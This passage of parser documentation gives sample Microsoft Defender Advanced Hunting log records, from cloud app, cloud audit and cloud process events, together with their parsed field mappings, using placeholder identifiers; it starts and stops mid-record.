urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationType\":\"ZappedFileInvestigation\",\"LastUpdateTimeUtc\":\"2023-09-29T10:54:43Z\",\"ObjectId\":\"11111111-1111-1111-1111-222222222222\",\"Operation\":\"AirInvestigationData\",\"OrganizationId\":\"55555555-5555-5555-5555-555555555555\",\"RecordType\":64,\"RunningTime\":6762,\"StartTimeUtc\":\"2023-09-29T09:44:07Z\",\"Status\":\"Remediated\",\"UserId\":\"AirInvestigation\",\"UserKey\":\"AirInvestigation\",\"UserType\":4,\"Version\":1,\"Workload\":\"AirInvestigation\"}"
            },
            "type": "AirInvestigationData"
        },
        "email": {
            "attachments": [
                {
                    "file": {
                        "hash": {
                            "sha256": "EC7D1FD05AE26420DE1E51F2F315E07F9A4AF5A4A81AD43BDDE7C70EF45ADE68"
                        },
                        "name": "pix.png"
                    }
                }
            ]
        },
        "microsoft": {
            "defender": {
                "activity": {
                    "objects": [
                        {
                            "ApplicationId": 11161,
                            "ApplicationInstance": 0,
                            "Id": "airinvestigation",
                            "Name": "airinvestigation",
                            "Role": "Actor",
                            "Type": "Account"
                        }
                    ],
                    "type": "Basic"
                },
                "investigation": {
                    "id": "urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd",
                    "name": "Mail with malicious file is zapped - urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd",
                    "status": "Remediated",
                    "type": "ZappedFileInvestigation"
                },
                "report": {
                    "id": "60913494_11161_11111111-1111-1111-1111-222222222222"
                }
            }
        },
        "user": {
            "full_name": "airinvestigation"
        }
    }
    	
	```


=== "test_cloud_app2.json"

    ```json
	
    {
        "message": "{\n  \"time\": \"2023-09-29T11:45:09.7408937Z\",\n  \"tenantId\": \"11111111-1111-1111-1111-111111111111\",\n  \"operationName\": \"Publish\",\n  \"category\": \"AdvancedHunting-CloudAppEvents\",\n  \"properties\": {\n    \"ActionType\": \"AirInvestigationData\",\n    \"ApplicationId\": 11161,\n    \"AccountDisplayName\": \"airinvestigation\",\n    \"AccountObjectId\": null,\n    \"AccountId\": \"airinvestigation\",\n    \"DeviceType\": null,\n    \"OSPlatform\": null,\n    \"IPAddress\": null,\n    \"IsAnonymousProxy\": null,\n    \"CountryCode\": null,\n    \"City\": null,\n    \"ISP\": null,\n    \"UserAgent\": null,\n    \"IsAdminOperation\": false,\n    \"ActivityObjects\": [\n      {\n        \"Type\": \"Account\",\n        \"Role\": \"Actor\",\n        \"Name\": \"airinvestigation\",\n        \"Id\": \"airinvestigation\",\n        \"ApplicationId\": 11161,\n        \"ApplicationInstance\": 0\n      }\n    ],\n    \"AdditionalFields\": {},\n    \"ActivityType\": \"Basic\",\n    \"ObjectName\": null,\n    \"ObjectType\": null,\n    \"ObjectId\": null,\n    \"AppInstanceId\": 0,\n    \"AccountType\": \"Regular\",\n    \"IsExternalUser\": false,\n    \"IsImpersonated\": false,\n    \"IPTags\": null,\n    \"IPCategory\": null,\n    \"UserAgentTags\": null,\n    \"RawEventData\": {\n      \"Actions\": [],\n      \"CreationTime\": \"2023-09-29T11:40:30Z\",\n      \"DeepLinkUrl\": \"https://security.microsoft.com/mtp-investigation/urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\n      \"EndTimeUtc\": \"2023-09-29T11:34:37Z\",\n      \"Id\": \"22222222-2222-2222-2222-222222222222\",\n      \"InvestigationId\": \"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\n      \"InvestigationName\": \"Mail with malicious file is zapped - urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\n      \"InvestigationType\": \"ZappedFileInvestigation\",\n      \"LastUpdateTimeUtc\": \"2023-09-29T10:54:43Z\",\n      \"ObjectId\": \"22222222-2222-2222-2222-222222222222\",\n      \"Operation\": \"AirInvestigationData\",\n      \"OrganizationId\": \"11111111-1111-1111-1111-111111111111\",\n      \"RecordType\": 64,\n      \"RunningTime\": 6762,\n      \"StartTimeUtc\": \"2023-09-29T09:44:07Z\",\n      \"Status\": \"Remediated\",\n      \"UserId\": \"AirInvestigation\",\n      \"UserKey\": \"AirInvestigation\",\n      \"UserType\": 4,\n      \"Version\": 1,\n      \"Workload\": \"AirInvestigation\"\n    },\n    \"ReportId\": \"60913494_11161_22222222-2222-2222-2222-222222222222\",\n    \"Timestamp\": \"2023-09-29T11:40:30Z\",\n    \"Application\": \"Microsoft 365\"\n  },\n  \"Tenant\": \"DefaultTenant\"\n}\n",
        "event": {
            "category": [
                "intrusion_detection"
            ],
            "dataset": "cloud_app_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2023-09-29T11:40:30Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Microsoft 365",
                "ApplicationId": "11161",
                "IsAdminOperation": "false",
                "IsExternalUser": false,
                "IsImpersonated": false,
                "RawEventData": "{\"Actions\":[],\"CreationTime\":\"2023-09-29T11:40:30Z\",\"DeepLinkUrl\":\"https://security.microsoft.com/mtp-investigation/urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"EndTimeUtc\":\"2023-09-29T11:34:37Z\",\"Id\":\"22222222-2222-2222-2222-222222222222\",\"InvestigationId\":\"urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationName\":\"Mail with malicious file is zapped - urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd\",\"InvestigationType\":\"ZappedFileInvestigation\",\"LastUpdateTimeUtc\":\"2023-09-29T10:54:43Z\",\"ObjectId\":\"22222222-2222-2222-2222-222222222222\",\"Operation\":\"AirInvestigationData\",\"OrganizationId\":\"11111111-1111-1111-1111-111111111111\",\"RecordType\":64,\"RunningTime\":6762,\"StartTimeUtc\":\"2023-09-29T09:44:07Z\",\"Status\":\"Remediated\",\"UserId\":\"AirInvestigation\",\"UserKey\":\"AirInvestigation\",\"UserType\":4,\"Version\":1,\"Workload\":\"AirInvestigation\"}"
            },
            "type": "AirInvestigationData"
        },
        "microsoft": {
            "defender": {
                "activity": {
                    "objects": [
                        {
                            "ApplicationId": 11161,
                            "ApplicationInstance": 0,
                            "Id": "airinvestigation",
                            "Name": "airinvestigation",
                            "Role": "Actor",
                            "Type": "Account"
                        }
                    ],
                    "type": "Basic"
                },
                "investigation": {
                    "id": "urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd",
                    "name": "Mail with malicious file is zapped - urn:ZappedFileInvestigation:13e4f3241b8e49faa8c8adcdb3d620dd",
                    "status": "Remediated",
                    "type": "ZappedFileInvestigation"
                },
                "report": {
                    "id": "60913494_11161_22222222-2222-2222-2222-222222222222"
                }
            }
        },
        "user": {
            "full_name": "airinvestigation"
        }
    }
    	
	```


=== "test_cloud_app3.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-03T11:29:06.6566759Z\",\"tenantId\":\"33333333-3333-3333-3333-333333333333\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-CloudAppEvents\",\"_TimeReceivedBySvc\":\"2024-10-03T11:27:41.2820000Z\",\"properties\":{\"ActionType\":\"MailItemsAccessed\",\"ApplicationId\":20893,\"AccountDisplayName\":\"22222222-2222-2222-2222-222222222222\",\"AccountObjectId\":null,\"AccountId\":\"22222222-2222-2222-2222-222222222222\",\"DeviceType\":\"Other\",\"OSPlatform\":\"Unknown\",\"IPAddress\":\"fe80:0011:2233:4455:6677:8899:AABB:CCDD\",\"IsAnonymousProxy\":false,\"CountryCode\":\"US\",\"City\":\"redmond\",\"ISP\":\"Microsoft Corporation\",\"UserAgent\":\"Client=REST;Client=RESTSystem;;\",\"IsAdminOperation\":false,\"ActivityObjects\":[{\"Type\":\"Structured object\",\"Role\":\"Parameter\",\"ServiceObjectType\":\"Session ID\"},{\"Type\":\"Task\",\"Role\":\"Target object\",\"Name\":\"MailItemsAccessed\"},{\"Type\":\"Property\",\"Role\":\"Parameter\",\"Name\":\"MailAccessType\",\"Value\":\"Bind\"},{\"Type\":\"Property\",\"Role\":\"Parameter\",\"Name\":\"IsThrottled\",\"Value\":\"False\"},{\"Type\":\"Account\",\"Role\":\"Actor\",\"Name\":\"22222222-2222-2222-2222-222222222222\",\"Id\":\"22222222-2222-2222-2222-222222222222\",\"ApplicationId\":11161,\"ApplicationInstance\":0},{\"Type\":\"User\",\"Role\":\"Parameter\",\"Name\":\"John DOE\",\"Id\":\"55555555-5555-5555-5555-555555555555\",\"ApplicationId\":11161,\"ApplicationInstance\":0}],\"AdditionalFields\":{\"IsSatelliteProvider\":false},\"ActivityType\":\"Run\",\"ObjectName\":\"MailItemsAccessed\",\"ObjectType\":\"Task\",\"ObjectId\":null,\"AppInstanceId\":0,\"AccountType\":\"Application\",\"IsExternalUser\":false,\"IsImpersonated\":false,\"IPTags\":[\"Microsoft Corporation\"],\"IPCategory\":\"Cloud provider\",\"UserAgentTags\":null,\"RawEventData\":{\"AppId\":\"22222222-2222-2222-2222-222222222222\",\"ClientAppId\":\"22222222-2222-2222-2222-222222222222\",\"ClientIPAddress\":\"fe80:0011:2233:4455:6677:8899:AABB:CCDD\",\"ClientInfoString\":\"Client=REST;Client=RESTSystem;;\",\"CreationTime\":\"2024-10-03T11:23:17Z\",\"ExternalAccess\":false,\"Folders\":[{\"FolderItems\":[{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID1\",\"InternetMessageId\":\"<1641470871.2259807.1727868231060@ltx1-app86239.prod.linkedin.com>\",\"SizeInBytes\":584240},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID2\",\"InternetMessageId\":\"<1.prod.linkedin.com>\",\"SizeInBytes\":541152},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID4\",\"InternetMessageId\":\"<2.prod.linkedin.com>\",\"SizeInBytes\":594034},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID5\",\"InternetMessageId\":\"<1@emsecure.net>\",\"SizeInBytes\":134730},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID6\",\"InternetMessageId\":\"<1@geopod-ismtpd-10>\",\"SizeInBytes\":343263},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID7\",\"InternetMessageId\":\"<1@.prod.linkedin.com>\",\"SizeInBytes\":584542}],\"Id\":\"ID8\",\"Path\":\"\\\\Bo\\u00eete de r\\u00e9ception\"}],\"Id\":\"11111111-1111-1111-1111-111111111111\",\"InternalLogonType\":0,\"LogonType\":0,\"LogonUserSid\":\"S-1\",\"MailboxGuid\":\"66666666-6666-6666-6666-666666666666\",\"MailboxOwnerSid\":\"S-1\",\"MailboxOwnerUPN\":\"john.doe@example.com\",\"Operation\":\"MailItemsAccessed\",\"OperationCount\":6,\"OperationProperties\":[{\"Name\":\"MailAccessType\",\"Value\":\"Bind\"},{\"Name\":\"IsThrottled\",\"Value\":\"False\"}],\"OrganizationId\":\"33333333-3333-3333-3333-333333333333\",\"OrganizationName\":\"neoma.onmicrosoft.com\",\"OriginatingServer\":\"PAWPR07MB9438 (15.20.4200.000)\\r\\n\",\"RecordType\":50,\"ResultStatus\":\"Succeeded\",\"UserId\":\"john.doe@example.com\",\"UserKey\":\"22222222-2222-2222-2222-222222222222\",\"UserType\":5,\"Version\":1,\"Workload\":\"Exchange\"},\"ReportId\":\"98261974_20893_11111111-1111-1111-1111-111111111111\",\"Timestamp\":\"2024-10-03T11:23:17Z\",\"Application\":\"Microsoft Exchange Online\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "cloud_app_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-03T11:23:17Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Microsoft Exchange Online",
                "ApplicationId": "20893",
                "IPCategory": "Cloud provider",
                "IPTags": [
                    "Microsoft Corporation"
                ],
                "ISP": "Microsoft Corporation",
                "IsAdminOperation": "false",
                "IsAnonymousProxy": "false",
                "IsExternalUser": false,
                "IsImpersonated": false,
                "ObjectName": "MailItemsAccessed",
                "ObjectType": "Task",
                "RawEventData": "{\"AppId\":\"22222222-2222-2222-2222-222222222222\",\"ClientAppId\":\"22222222-2222-2222-2222-222222222222\",\"ClientIPAddress\":\"fe80:0011:2233:4455:6677:8899:AABB:CCDD\",\"ClientInfoString\":\"Client=REST;Client=RESTSystem;;\",\"CreationTime\":\"2024-10-03T11:23:17Z\",\"ExternalAccess\":false,\"Folders\":[{\"FolderItems\":[{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID1\",\"InternetMessageId\":\"<1641470871.2259807.1727868231060@ltx1-app86239.prod.linkedin.com>\",\"SizeInBytes\":584240},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID2\",\"InternetMessageId\":\"<1.prod.linkedin.com>\",\"SizeInBytes\":541152},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID4\",\"InternetMessageId\":\"<2.prod.linkedin.com>\",\"SizeInBytes\":594034},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID5\",\"InternetMessageId\":\"<1@emsecure.net>\",\"SizeInBytes\":134730},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID6\",\"InternetMessageId\":\"<1@geopod-ismtpd-10>\",\"SizeInBytes\":343263},{\"ClientRequestId\":\"44444444-4444-4444-4444-444444444444\",\"Id\":\"ID7\",\"InternetMessageId\":\"<1@.prod.linkedin.com>\",\"SizeInBytes\":584542}],\"Id\":\"ID8\",\"Path\":\"\\\\Bo\u00eete de r\u00e9ception\"}],\"Id\":\"11111111-1111-1111-1111-111111111111\",\"InternalLogonType\":0,\"LogonType\":0,\"LogonUserSid\":\"S-1\",\"MailboxGuid\":\"66666666-6666-6666-6666-666666666666\",\"MailboxOwnerSid\":\"S-1\",\"MailboxOwnerUPN\":\"john.doe@example.com\",\"Operation\":\"MailItemsAccessed\",\"OperationCount\":6,\"OperationProperties\":[{\"Name\":\"MailAccessType\",\"Value\":\"Bind\"},{\"Name\":\"IsThrottled\",\"Value\":\"False\"}],\"OrganizationId\":\"33333333-3333-3333-3333-333333333333\",\"OrganizationName\":\"neoma.onmicrosoft.com\",\"OriginatingServer\":\"PAWPR07MB9438 (15.20.4200.000)\\r\\n\",\"RecordType\":50,\"ResultStatus\":\"Succeeded\",\"UserId\":\"john.doe@example.com\",\"UserKey\":\"22222222-2222-2222-2222-222222222222\",\"UserType\":5,\"Version\":1,\"Workload\":\"Exchange\"}"
            },
            "type": "MailItemsAccessed"
        },
        "host": {
            "os": {
                "full": "Unknown"
            },
            "type": "Other"
        },
        "microsoft": {
            "defender": {
                "activity": {
                    "objects": [
                        {
                            "Role": "Parameter",
                            "ServiceObjectType": "Session ID",
                            "Type": "Structured object"
                        },
                        {
                            "Name": "MailItemsAccessed",
                            "Role": "Target object",
                            "Type": "Task"
                        },
                        {
                            "Name": "MailAccessType",
                            "Role": "Parameter",
                            "Type": "Property",
                            "Value": "Bind"
                        },
                        {
                            "Name": "IsThrottled",
                            "Role": "Parameter",
                            "Type": "Property",
                            "Value": "False"
                        },
                        {
                            "ApplicationId": 11161,
                            "ApplicationInstance": 0,
                            "Id": "22222222-2222-2222-2222-222222222222",
                            "Name": "22222222-2222-2222-2222-222222222222",
                            "Role": "Actor",
                            "Type": "Account"
                        },
                        {
                            "ApplicationId": 11161,
                            "ApplicationInstance": 0,
                            "Id": "55555555-5555-5555-5555-555555555555",
                            "Name": "John DOE",
                            "Role": "Parameter",
                            "Type": "User"
                        }
                    ],
                    "type": "Run"
                },
                "operation": {
                    "properties": {
                        "IsThrottled": "False",
                        "MailAccessType": "Bind"
                    }
                },
                "report": {
                    "id": "98261974_20893_11111111-1111-1111-1111-111111111111"
                }
            }
        },
        "related": {
            "ip": [
                "fe80:11:2233:4455:6677:8899:aabb:ccdd"
            ]
        },
        "source": {
            "address": "fe80:11:2233:4455:6677:8899:aabb:ccdd",
            "geo": {
                "city_name": "redmond"
            },
            "ip": "fe80:11:2233:4455:6677:8899:aabb:ccdd"
        },
        "user": {
            "full_name": "22222222-2222-2222-2222-222222222222"
        },
        "user_agent": {
            "device": {
                "name": "Other"
            },
            "name": "Other",
            "original": "Client=REST;Client=RESTSystem;;",
            "os": {
                "name": "Other"
            }
        }
    }
    	
	```


=== "test_cloud_app4.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-28T14:24:31.9854915Z\",\"tenantId\":\"44444444-4444-4444-4444-444444444444\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-CloudAppEvents\",\"_TimeReceivedBySvc\":\"2024-10-28T14:20:30.0960000Z\",\"properties\":{\"ActionType\":\"MessageReadReceiptReceived\",\"ApplicationId\":28375,\"AccountDisplayName\":\"John DOE\",\"AccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"AccountId\":\"22222222-2222-2222-2222-222222222222\",\"DeviceType\":null,\"OSPlatform\":null,\"IPAddress\":null,\"IsAnonymousProxy\":null,\"CountryCode\":null,\"City\":null,\"ISP\":null,\"UserAgent\":null,\"IsAdminOperation\":false,\"ActivityObjects\":[{\"Type\":\"Structured object\",\"Role\":\"Parameter\",\"ServiceObjectType\":\"Microsoft Team\"},{\"Type\":\"User\",\"Role\":\"Actor\",\"Name\":\"John DOE\",\"Id\":\"22222222-2222-2222-2222-222222222222\",\"ApplicationId\":11161,\"ApplicationInstance\":0}],\"AdditionalFields\":{},\"ActivityType\":\"Basic\",\"ObjectName\":null,\"ObjectType\":null,\"ObjectId\":null,\"AppInstanceId\":0,\"AccountType\":\"Regular\",\"IsExternalUser\":false,\"IsImpersonated\":false,\"IPTags\":null,\"IPCategory\":null,\"UserAgentTags\":null,\"RawEventData\":{\"ChatThreadId\":\"19:22222222-2222-2222-2222-222222222222_33333333-3333-3333-3333-333333333333@eu.test.com\",\"CommunicationType\":\"GroupChat\",\"CreationTime\":\"2024-10-28T14:18:38Z\",\"ExtraProperties\":[],\"Id\":\"11111111-1111-1111-1111-111111111111\",\"ItemName\":\"19:22222222-2222-2222-2222-222222222222_33333333-3333-3333-3333-333333333333@eu.test.com\",\"MessageId\":\"1730125116564\",\"MessageVersion\":\"0\",\"MessageVisibilityTime\":\"2022-09-21T08:33:35Z\",\"Operation\":\"MessageReadReceiptReceived\",\"OrganizationId\":\"44444444-4444-4444-4444-444444444444\",\"ParticipantInfo\":{\"HasForeignTenantUsers\":false,\"HasGuestUsers\":false,\"HasOtherGuestUsers\":false,\"HasUnauthenticatedUsers\":false,\"ParticipatingDomains\":[],\"ParticipatingSIPDomains\":[],\"ParticipatingTenantIds\":[\"44444444-4444-4444-4444-444444444444\"]},\"RecordType\":25,\"ResourceTenantId\":\"44444444-4444-4444-4444-444444444444\",\"UserId\":\"john.doe@company.fr\",\"UserKey\":\"22222222-2222-2222-2222-222222222222\",\"UserType\":0,\"Version\":1,\"Workload\":\"MicrosoftTeams\"},\"ReportId\":\"98261974_28375_11111111-1111-1111-1111-111111111111\",\"Timestamp\":\"2024-10-28T14:18:38Z\",\"Application\":\"Microsoft Teams\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "cloud_app_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-28T14:18:38Z",
        "action": {
            "name": "Publish",
            "properties": {
                "Application": "Microsoft Teams",
                "ApplicationId": "28375",
                "IsAdminOperation": "false",
                "IsExternalUser": false,
                "IsImpersonated": false,
                "RawEventData": "{\"ChatThreadId\":\"19:22222222-2222-2222-2222-222222222222_33333333-3333-3333-3333-333333333333@eu.test.com\",\"CommunicationType\":\"GroupChat\",\"CreationTime\":\"2024-10-28T14:18:38Z\",\"ExtraProperties\":[],\"Id\":\"11111111-1111-1111-1111-111111111111\",\"ItemName\":\"19:22222222-2222-2222-2222-222222222222_33333333-3333-3333-3333-333333333333@eu.test.com\",\"MessageId\":\"1730125116564\",\"MessageVersion\":\"0\",\"MessageVisibilityTime\":\"2022-09-21T08:33:35Z\",\"Operation\":\"MessageReadReceiptReceived\",\"OrganizationId\":\"44444444-4444-4444-4444-444444444444\",\"ParticipantInfo\":{\"HasForeignTenantUsers\":false,\"HasGuestUsers\":false,\"HasOtherGuestUsers\":false,\"HasUnauthenticatedUsers\":false,\"ParticipatingDomains\":[],\"ParticipatingSIPDomains\":[],\"ParticipatingTenantIds\":[\"44444444-4444-4444-4444-444444444444\"]},\"RecordType\":25,\"ResourceTenantId\":\"44444444-4444-4444-4444-444444444444\",\"UserId\":\"john.doe@company.fr\",\"UserKey\":\"22222222-2222-2222-2222-222222222222\",\"UserType\":0,\"Version\":1,\"Workload\":\"MicrosoftTeams\"}"
            },
            "type": "MessageReadReceiptReceived"
        },
        "microsoft": {
            "defender": {
                "activity": {
                    "objects": [
                        {
                            "Role": "Parameter",
                            "ServiceObjectType": "Microsoft Team",
                            "Type": "Structured object"
                        },
                        {
                            "ApplicationId": 11161,
                            "ApplicationInstance": 0,
                            "Id": "22222222-2222-2222-2222-222222222222",
                            "Name": "John DOE",
                            "Role": "Actor",
                            "Type": "User"
                        }
                    ],
                    "type": "Basic"
                },
                "report": {
                    "id": "98261974_28375_11111111-1111-1111-1111-111111111111"
                }
            }
        },
        "user": {
            "full_name": "John DOE"
        }
    }
    	
	```


=== "test_cloud_audit_events.json"

    ```json
	
    {
        "message": "{\"time\": \"2025-10-24T09:40:48.4872846Z\", \"tenantId\": \"11111111-1111-1111-1111-111111111111\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-CloudAuditEvents\", \"_TimeReceivedBySvc\": \"2025-10-24T09:40:37.3042963Z\", \"properties\": {\"AuditSource\": \"Azure\", \"DataSource\": \"Azure Kubernetes Service\", \"ActionType\": \"CloudAuditEventOther\", \"OperationName\": \"watch\", \"AzureResourceId\": \"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster\", \"AwsResourceName\": null, \"GcpFullResourceName\": null, \"Account\": \"11111111-1111-1111-1111-111111111111\", \"IPAddress\": \"1.1.1.1,2.2.2.2\", \"IsAnonymousProxy\": null, \"CountryCode\": null, \"City\": null, \"ISP\": null, \"UserAgent\": \"controller/v0.0.0 (linux/amd64) kubernetes/$Format/leader-election\", \"RawEventData\": {\"Timestamp\": \"2025-10-24T09:39:26.550981Z\", \"StageTimestamp\": \"2025-10-24T09:39:26.550981Z\", \"AzureResourceId\": \"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster\", \"Region\": \"westeurope\", \"Annotations\": {\"authorization.k8s.io/decision\": \"allow\", \"authorization.k8s.io/reason\": \"RBAC: allowed by ClusterRoleBinding \\\"cert-manager-controller-challenges\\\" of ClusterRole \\\"cert-manager-controller-challenges\\\" to ServiceAccount \\\"cert-manager/cert-manager\\\"\"}, \"ApiVersion\": \"audit.k8s.io/v1\", \"AuditID\": \"11111111-1111-1111-1111-111111111111\", \"Level\": \"Metadata\", \"Metadata\": null, \"ObjectRef\": {\"resource\": \"deployments\", \"apiVersion\": \"v1\"}, \"RequestObject\": null, \"RequestReceivedTimestamp\": \"2025-10-24T09:32:39.549375Z\", \"DataPipelineMetadata\": {\"EventName\": \"ControlPlaneEventsNonShoebox\", \"EventVersion\": \"Ver149v0\", \"AccountMoniker\": \"AKSCustomerDataweu\", \"AccountMonikerRegion\": \"centraleurope\", \"OriginalEventHubEnqueueUtc\": \"2025-10-24 09:40:30Z\", \"GDSEventHubEnqueueUtc\": \"2025-10-24 09:40:33Z\", \"SDSQueryExecutionUtc\": \"2025-10-24T09:40:35.9696345Z\"}, \"RequestURI\": \"/api/v1/deployments?watch=true&resourceVersion=12345678\", \"ResponseObject\": null, \"ResponseStatus\": {\"metadata\": {}, \"status\": \"Success\", \"message\": \"Connection closed early\", \"code\": 200}, \"SourceIPs\": [\"1.1.1.1\", \"2.2.2.2\"], \"Stage\": \"ResponseComplete\", \"User\": {\"username\": \"system:serviceaccount:cert-manager:cert-manager\", \"uid\": \"11111111-1111-1111-1111-111111111111\", \"groups\": [\"system:serviceaccounts\", \"system:serviceaccounts:cert-manager\", \"system:authenticated\"], \"extra\": {\"authentication.kubernetes.io/pod-name\": [\"cert-manager-000000-00000\"], \"authentication.kubernetes.io/pod-uid\": [\"11111111-1111-1111-1111-111111111111\"]}}, \"UserAgent\": \"controller/v0.0.0 (linux/amd64) kubernetes/$Format/leader-election\", \"Verb\": \"watch\", \"EventID\": \"AKSAuditLog\", \"CdiPartitionKey\": \"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster\"}, \"AdditionalFields\": null, \"Timestamp\": \"2025-10-24T09:39:26.550981Z\", \"ReportId\": \"11111111-1111-1111-1111-111111111111\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "cloud_audit_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-24T09:39:26.550981Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ActionType": "CloudAuditEventOther",
                "AzureResourceId": "/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster",
                "DataSource": "Azure Kubernetes Service",
                "RawEventData": "{\"Annotations\":{\"authorization.k8s.io/decision\":\"allow\",\"authorization.k8s.io/reason\":\"RBAC: allowed by ClusterRoleBinding \\\"cert-manager-controller-challenges\\\" of ClusterRole \\\"cert-manager-controller-challenges\\\" to ServiceAccount \\\"cert-manager/cert-manager\\\"\"},\"ApiVersion\":\"audit.k8s.io/v1\",\"AuditID\":\"11111111-1111-1111-1111-111111111111\",\"AzureResourceId\":\"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster\",\"CdiPartitionKey\":\"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.ContainerService/managedClusters/mycluster\",\"DataPipelineMetadata\":{\"AccountMoniker\":\"AKSCustomerDataweu\",\"AccountMonikerRegion\":\"centraleurope\",\"EventName\":\"ControlPlaneEventsNonShoebox\",\"EventVersion\":\"Ver149v0\",\"GDSEventHubEnqueueUtc\":\"2025-10-24 09:40:33Z\",\"OriginalEventHubEnqueueUtc\":\"2025-10-24 09:40:30Z\",\"SDSQueryExecutionUtc\":\"2025-10-24T09:40:35.9696345Z\"},\"EventID\":\"AKSAuditLog\",\"Level\":\"Metadata\",\"Metadata\":null,\"ObjectRef\":{\"apiVersion\":\"v1\",\"resource\":\"deployments\"},\"Region\":\"westeurope\",\"RequestObject\":null,\"RequestReceivedTimestamp\":\"2025-10-24T09:32:39.549375Z\",\"RequestURI\":\"/api/v1/deployments?watch=true&resourceVersion=12345678\",\"ResponseObject\":null,\"ResponseStatus\":{\"code\":200,\"message\":\"Connection closed early\",\"metadata\":{},\"status\":\"Success\"},\"SourceIPs\":[\"1.1.1.1\",\"2.2.2.2\"],\"Stage\":\"ResponseComplete\",\"StageTimestamp\":\"2025-10-24T09:39:26.550981Z\",\"Timestamp\":\"2025-10-24T09:39:26.550981Z\",\"User\":{\"extra\":{\"authentication.kubernetes.io/pod-name\":[\"cert-manager-000000-00000\"],\"authentication.kubernetes.io/pod-uid\":[\"11111111-1111-1111-1111-111111111111\"]},\"groups\":[\"system:serviceaccounts\",\"system:serviceaccounts:cert-manager\",\"system:authenticated\"],\"uid\":\"11111111-1111-1111-1111-111111111111\",\"username\":\"system:serviceaccount:cert-manager:cert-manager\"},\"UserAgent\":\"controller/v0.0.0 (linux/amd64) kubernetes/$Format/leader-election\",\"Verb\":\"watch\"}"
            },
            "type": "CloudAuditEventOther"
        },
        "cloud": {
            "account": {
                "id": "11111111-1111-1111-1111-111111111111"
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111"
                }
            }
        },
        "user_agent": {
            "device": {
                "name": "Other"
            },
            "name": "Other",
            "original": "controller/v0.0.0 (linux/amd64) kubernetes/$Format/leader-election",
            "os": {
                "name": "Linux"
            }
        }
    }
    	
	```


=== "test_cloud_process_events.json"

    ```json
	
    {
        "message": "{\"time\": \"2025-10-06T06:24:57.1637130Z\", \"tenantId\": \"33333333-3333-3333-3333-333333333333\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-CloudProcessEvents\", \"_TimeReceivedBySvc\": \"2025-10-06T06:24:54.0067997Z\", \"properties\": {\"AzureResourceId\": \"/subscriptions/22222222-2222-2222-2222-222222222222/resourceGroups/rg-pf-dmp-stg/providers/Microsoft.ContainerService/managedClusters/CLUSTER\", \"AwsResourceName\": null, \"GcpFullResourceName\": null, \"ContainerImageName\": \":\", \"KubernetesNamespace\": null, \"KubernetesPodName\": null, \"KubernetesResource\": \"\", \"ContainerName\": \"host\", \"ContainerId\": null, \"ActionType\": \"ProcessCreated\", \"FileName\": \"/usr/bin/bash\", \"FolderPath\": \"/usr/bin/bash\", \"ProcessId\": 123, \"ProcessName\": \"bash\", \"ParentProcessName\": \"check_terminate\", \"ParentProcessId\": 456, \"ProcessCommandLine\": \"/etc/node-problem-detector.d/plugin/check_scheduledevent.sh -t Terminate -m 54\", \"ProcessCreationTime\": \"2025-10-06T06:24:04.3899689Z\", \"ProcessCurrentWorkingDirectory\": \"/\", \"AccountName\": \"root\", 